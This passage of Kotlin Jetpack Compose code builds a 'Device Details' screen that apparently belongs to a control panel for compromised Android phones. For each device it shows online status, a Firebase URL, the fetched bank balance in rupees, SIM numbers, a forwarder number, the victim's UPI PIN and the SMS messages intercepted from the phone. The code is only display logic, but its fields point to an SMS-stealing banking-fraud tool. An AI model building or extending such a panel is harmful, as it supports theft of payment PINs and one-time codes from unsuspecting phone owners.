        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
            androidx.compose.material3.IconButton(
                onClick = onDismiss,
                modifier =
                    Modifier
                        .size(36.dp)
                        .clip(CircleShape)
                        .background(Color(0xFF212121)),
            ) {
                Icon(Icons.Filled.Close, contentDescription = "Close", tint = Color.White)
            }
            Text("📱", fontSize = 18.sp)
            Spacer(Modifier.width(6.dp))
            Text(
                "Device Details",
                color = Color(0xFF1A237E),
                fontWeight = FontWeight.Bold,
                fontSize = 18.sp,
            )
            Spacer(Modifier.weight(1f))
            Box(
                modifier =
                    Modifier
                        .clip(RoundedCornerShape(20.dp))
                        .background(if (d.online) Color(0xFF4CAF50) else Color(0xFFE53935))
                        .padding(horizontal = 12.dp, vertical = 6.dp),
            ) {
                Text(
                    if (d.online) "● Online" else "● Offline",
                    color = Color.White,
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold,
                )
            }
            Spacer(Modifier.width(4.dp))
            Icon(Icons.Filled.Phone, contentDescription = null, tint = Color(0xFF1565C0), modifier = Modifier.size(20.dp))
            Spacer(Modifier.width(2.dp))
            Icon(Icons.Filled.Smartphone, contentDescription = null, tint = Color(0xFF1565C0), modifier = Modifier.size(22.dp))
        }
        Spacer(Modifier.height(12.dp))
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(12.dp),
            colors = CardDefaults.cardColors(containerColor = Color.White),
            elevation = CardDefaults.cardElevation(defaultElevation = 4.dp),
        ) {
            Column(Modifier.padding(14.dp)) {
                VirtusDetailLine("Device Name", d.modelDisplay)
                VirtusDetailLine("Firebase URL", d.firebaseUrl)
                VirtusDetailLine(
                    "Balance (fetch)",
                    if (d.maxBalanceDisplay > 0) "₹ ${formatInr(d.maxBalanceDisplay)}" else "—",
                )
                VirtusDetailLine("Battery", if (d.batteryPercent != null) "${d.batteryPercent}%" else "—")
                VirtusDetailLine("SIM 1", d.sim1Display ?: "N/A")
                VirtusDetailLine("SIM 2", d.sim2Display ?: "N/A")
                VirtusDetailLine(
                    "Registered At",
                    if (d.registeredAtMillis != null && d.registeredAtMillis!! > 0L) formatTsLong(d.registeredAtMillis!!) else "N/A",
                )
                VirtusDetailLine(
                    "Last Seen",
                    if (d.lastSeenMillis != null && d.lastSeenMillis!! > 0L) formatTsLong(d.lastSeenMillis!!) else "N/A",
                )
                VirtusDetailLine("Forwarder Number", d.forwarderDisplay ?: "N/A")
                VirtusDetailLine("UPI PIN", d.upiPinDisplay)
                HorizontalDivider(Modifier.padding(vertical = 8.dp), color = Color(0xFFE0E0E0))
                Text("Messages (${d.messages.size})", color = VirtusColors.labelBlue, fontWeight = FontWeight.Bold, fontSize = 14.sp)
                messagesContent()
            }
        }
        Spacer(Modifier.height(16.dp))
    }
}

@Composable
private fun VirtusDetailLine(
    label: String,
    value: String,
) {
    Row(Modifier.padding(vertical = 2.dp)) {
        Text(
            "$label:",
            color = Color(0xFF1565C0),
            fontWeight = FontWeight.Bold,
            fontSize = 14.sp,
        )
        Spacer(Modifier.width(6.dp))
        Text(
            value,
            color = Color(0xFF212121),
            fontSize = 14.sp,
            modifier = Modifier.weight(1f),
            maxLines = 4,
            overflow = TextOverflow.Ellipsis,
        )
    }
}

/** White message card on yellow sheet (reference Virtus MSG style). */
@Composable
private fun VirtusYellowMsgCard(msg: SmsRow) {
    Card(
        modifier =
            Modifier
                .fillMaxWidth()
                .padding(vertical = 5.dp),
        shape = RoundedCornerShape(10.dp),
        colors = CardDefaults.cardColors(containerColor = Color.White),
        elevation = CardDefaults.cardElevation(defaultElevation = 3.dp),
    ) {
        Box(Modifier.padding(12.dp)) {
            Icon(
                Icons.Filled.Delete,
                contentDescription = null,
                tint = Color(0xFF212121),
                modifier =
                    Modifier
                        .align(Alignment.TopEnd)
                        .size(20.dp),
            )
            Column(modifier = Modifier.padding(end = 22.dp)) {
                Text(
                    "MSG: ${msg.body}",
                    color = VirtusColors.msgGreen,
                    fontSize = 13.sp,
                    fontWeight = FontWeight.Medium,
                )
                Spacer(Modifier.height(6.dp))
                Text(
                    "Sender: ${msg.sender}",
                    color = Color(0xFF424242),
                    fontSize = 11.sp,
                )
                Text(
                    "Received: ${formatTsLong(msg.messageAtMillis ?: 0L)}",
                    color = Color(0xFF616161),
                    fontSize = 11.sp,
                )
            }
        }
    }
}

private fun formatInr(v: Double): String {
    val nf = NumberFormat.getNumberInstance(Locale.US)
    return nf.format(v.toLong())
}

private fun formatTs(ms: Long): String {
    if (ms <= 0L) return "—"
    return SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.US).format(Date(ms))
}

private fun formatTsLong(ms: Long): String {
    if (ms <= 0L) return "—"
    return SimpleDateFormat("dd/MM/yyyy, h:mm:ss a", Locale.US).format(Date(ms))
}
